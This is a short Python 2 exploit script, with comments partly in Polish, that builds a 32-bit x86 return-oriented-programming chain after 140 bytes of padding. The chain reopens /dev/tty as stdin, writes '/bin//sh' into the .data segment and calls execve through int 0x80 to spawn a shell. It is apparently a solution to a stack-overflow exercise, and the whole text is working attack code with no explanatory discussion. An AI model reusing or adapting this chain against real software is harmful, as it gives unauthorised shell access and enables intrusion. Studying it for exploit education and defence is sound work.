from struct import pack

p = ''

# close(0)

p += pack('<I', 0x080544e0)  # xor eax, eax ; ret
p += pack('<I', 0x080481c9)  # pop ebx ; ret
p += pack('<I', 0x00000000)  # 0 -> EBX
p += pack('<I', 0x0808fd50)  # add eax, 3 ; ret
p += pack('<I', 0x0808fd50)  # add eax, 3 ; ret
p += pack('<I', 0x08049401)  # int 0x80
#
# open("/dev/tty", O_RDWR | ...)
p += pack('<I', 0x080bbec6)  # push eax ; ret
p += pack('<I', 0x080eb060)  # @ .data - poczatek segmentu .data (wziety 'z dupy' jako storage)
p += pack('<I', 0x080bbf26)  # pop eax ; ret
p += '/dev'
p += pack('<I', 0x0809a95d)  # mov dword ptr [edx], eax ; ret <- wpisanie do pamieci
# --
p += pack('<I', 0x0806ec5a)  # pop edx ; ret
p += pack('<I', 0x080eb064)  # @ .data + 4
p += pack('<I', 0x080bbf26)  # pop eax ; ret
p += '/tty'
p += pack('<I', 0x0809a95d)  # mov dword ptr [edx], eax ; ret <- wpisanie do pamieci
# --
p += pack('<I', 0x0806ec5a)  # pop edx ; ret
p += pack('<I', 0x080eb068)  # @ .data + 8
p += pack('<I', 0x080544e0)  # xor eax, eax ; ret
p += pack('<I', 0x0809a95d)  # mov dword ptr [edx], eax ; ret <- wpisanie do pamieci
# --
p += pack('<I', 0x080e55ad)  # pop ecx ; ret
p += pack('<I', 0x2712)      # own number
p += pack('<I', 0x0808fd50)  # add eax, 3 ; ret
p += pack('<I', 0x0808fd37)  # add eax, 2 ; ret
p += pack('<I', 0x08049401)  # int 0x80

p += pack('<I', 0x0806ec5a)  # pop edx ; ret
p += pack('<I', 0x080eb060)  # @ .data - poczatek segmentu .data (wziety 'z dupy' jako storage)
# ------------- Sciagniecie @ .data do EDX
p += pack('<I', 0x080bbf26)  # pop eax ; ret
p += '/bin'
# ------------- Sciagniecie /bin do EAX
p += pack('<I', 0x0809a95d)  # mov dword ptr [edx], eax ; ret
# ------------- Wpisanie pod adres w EDX zawartosci (wskaznika) w EAX
p += pack('<I', 0x0806ec5a)  # pop edx ; ret
p += pack('<I', 0x080eb064)  # @ .data + 4
# ------------- Sciagniecie @ .data + 4  do EDX
p += pack('<I', 0x080bbf26)  # pop eax ; ret
p += '//sh'
# ------------- Sciagniecie @ //sh do EAX
p += pack('<I', 0x0809a95d)  # mov dword ptr [edx], eax ; ret
# ------------- Wpisanie pod adres w EDX zawartosci (wskaznika) w EAX
p += pack('<I', 0x0806ec5a)  # pop edx ; ret
p += pack('<I', 0x080eb068)  # @ .data + 8
# ------------- Sciagniecie @ .data + 8  do EDX
p += pack('<I', 0x080544e0)  # xor eax, eax ; ret
p += pack('<I', 0x0809a95d)  # mov dword ptr [edx], eax ; ret
# ------------- Wpisanie pod adres w EDX zawartosci (wskaznika) w EAX - w tym wypadku nulla jako zakonczenie stringa
p += pack('<I', 0x080481c9)  # pop ebx ; ret
p += pack('<I', 0x080eb060)  # @ .data
# ------------- Wrzucenie do EBX adresu poczatku stringu /bin/sh
p += pack('<I', 0x080e55ad)  # pop ecx ; ret
p += pack('<I', 0x080eb068)  # @ .data + 8
# ------------- Wrzucenie do ECX adresu konca stringu /bin/sh - do execve
p += pack('<I', 0x0806ec5a)  # pop edx ; ret
p += pack('<I', 0x080eb068)  # @ .data + 8
# ------------- Wrzucenie do EDX adresu konca stringu /bin/sh - do execve
p += pack('<I', 0x080544e0)  # xor eax, eax ; ret
p += pack('<I', 0x0808fd50)  # add eax, 3 ; ret
p += pack('<I', 0x0808fd50)  # add eax, 3 ; ret
p += pack('<I', 0x0808fd50)  # add eax, 3 ; ret
p += pack('<I', 0x0808fd37)  # add eax, 2 ; ret
# ------------- Wrzucenie do EAX wartosci syscalla execve - 11
p += pack('<I', 0x08049401)  # int 0x80
# ------------- Syscall

full_payload = 'A' * 140 + p

print full_payload
